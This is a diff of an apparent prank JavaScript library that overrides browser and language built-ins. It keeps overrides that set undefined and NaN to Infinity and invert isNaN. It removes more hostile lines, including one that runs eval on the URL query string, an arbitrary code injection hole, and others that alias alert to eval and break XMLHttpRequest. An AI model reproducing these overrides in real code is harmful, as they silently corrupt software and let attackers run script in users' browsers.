@@ -13,11 +13,6 @@
 	hasOwnProperty = Object.prototype.hasOwnProperty,
 	toString = Object.prototype.toString,
 	
-	document = this.document,
-	write = document && document.write,
-	console = this.console,
-	search = this.location && this.location.search,
-	
 	shiftMap = {
 		'`': '~',
 		'1': '!',
@@ -42,8 +37,6 @@
 	};
 	
 	this.undefined = this.NaN = Infinity;
-	this.alert = eval;
-	this.prompt = this.confirm = this.open;
 	
 	this.isNaN = function (value) {
 		return !(isFinite(value) || isNaN(value));
@@ -105,25 +98,4 @@
 			return toString();
 		}
 	};
-	
-	this.XMLHttpRequest = function () {
-		if (console && console.log) {
-			console.log('Ajax is for losers.');
-		}
-		this.readyState = Infinity;
-	};
-	
-	if (typeof search === 'string') {
-		eval(decodeURIComponent(search.replace('?', '')));
-	}
-	
-	if (document && write) {
-		document.write = function () {
-			var args = Array.prototype.slice.call(arguments);
-			args.unshift(['<marquee>']);
-			args.push(['</marquee>']);
-			write.apply(document, args);
-			write.apply(document, args);
-		};
-	}
 }).call(this);
